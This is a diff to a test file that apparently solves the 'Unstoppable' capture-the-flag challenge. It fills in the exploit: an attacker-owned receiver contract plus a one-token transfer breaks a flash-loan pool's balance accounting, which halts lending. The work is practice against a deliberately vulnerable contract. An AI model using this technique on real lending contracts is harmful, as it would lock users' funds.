@@ -39,7 +39,17 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // Deploy malicious receiver contract where attacker is owner
+        const AttackerReceiverContractFactory = await ethers.getContractFactory('AttackerReceiverUnstoppable', attacker);
+        const attackerReceiverContract = await AttackerReceiverContractFactory.deploy(this.pool.address);
+        
+        // Send one token to malicious receiver, so that it could return
+        // one extra token (in addition to original loan), which will break pool-balance-accounting
+        // in the UnstoppableLender contract
+        await this.token.connect(attacker).transfer(attackerReceiverContract.address, 1);
+
+        // Execute flash loan
+        await attackerReceiverContract.connect(attacker).executeFlashLoan(10);
     });
 
     after(async function () {
